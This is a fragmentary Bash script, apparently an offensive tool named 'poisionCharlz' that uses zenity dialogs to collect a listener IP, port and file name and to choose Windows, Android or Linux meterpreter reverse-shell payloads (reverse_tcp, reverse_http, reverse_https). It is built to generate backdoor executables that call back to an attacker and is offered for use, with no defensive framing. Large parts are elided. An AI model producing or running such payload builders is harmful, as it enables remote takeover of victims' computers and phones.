...
if [[ $1 =~ ^(-v|-V|--version|--VERSION|version) ]] ; then
    ...
    zenity --info --width=500 --title="poisionCharlz ${setversion} / ${owner}" --text="OWNER: CHARLIE"
    exit 0
fi
## F(x)
...
function localip {
    lhost=$(zenity --entry --title "poisonCharlz $setversion / $owner" --text "Entire Your LocalIP 'Default LocalIP: $setlhost'\n(If You Don't Know Leave Blank)")
        
    if [ "$?" != 0 ] ; then
        echo "thanks for use poisionCharlz (^-^)"
        exit 0
    fi
...
function localport {
    lport=$(zenity --entry --title "poisionCharlz $setversion / $owner" --text "Entire Your LocalPort 'Default LPORT: $setlport' \n(If You Don't Know Leave Blank)")
...
function nameoFile {
    ...
    namefile=$(zenity --entry --width=300 --title "poisionCharlz $setversion / $owner" --text "Entire Name Of The File 'Default File Name: $setname'\n(If You Don't Know Leave Blank)")
...
trap ctrl_c INT
ctrl_c() {
    echo "Thx For Use poisionCharlz"
    randend=$(( RANDOM % 3 ))
    if [[ $randend = "1" ]] ; then
...
printf '\033[8;25;90t'
banner
center "Log Screen V1 - $today" #payload=$(zenity --width=360 --height=320 --list --title "poisionCharlz $setversion / $owner" --text "Choise a Platform..." --column Platforms "windows/meterpreter/reverse_tcp" "windows/meterpreter/reverse_http" "windows/meterpreter/reverse_tcp_dns")
echo -e "Set Lhost=> $setlhost\nSet Lport=> $setlport\nSet File Name=> $setname\n"
while :; do

    choiseplatform=$(zenity --width=360 --height=320 --list --title "poisionCharlz $setversion / $owner" --text "Choise a Platform..." --column Platforms "Windows" "Android" "Linux")
    center "Set Platform: ${choiseplatform}"
    if [ "$choiseplatform" = "Windows" ]; then
        
        payload=$(zenity --width=360 --height=220 --list --title "poisionCharlz $setversion / $owner" --text "Choise a Payload:" --radiolist --column "Choose" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_tcp_dns")
        ...
        if [[ -f ${setdir}/${namefile} ]] ; then
            ...
            zenity --progress \
            --width 400 \
            --title="poisionCharlz $setversion / $owner" \
        ...
        payload=$(zenity --width=360 --height=220 --list --title "poisionCharlz $setversion / $owner" --text "Choise a Payload:" --radiolist --column "Choose" --column "Option" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_http")
        ...
        payload=$(zenity --width=400 --height=250 --list --title "poisionCharlz $setversion / $owner" --text "Choise a Payload:" --radiolist --column "Choose" --column "Option" TRUE "linux/x86/meterpreter_reverse_tcp" FALSE "linux/x86/meterpreter_reverse_http" FALSE "linux/x86/meterpreter_reverse_https" FALSE "linux/x86/meterpreter/reverse_ipv6_tcp")
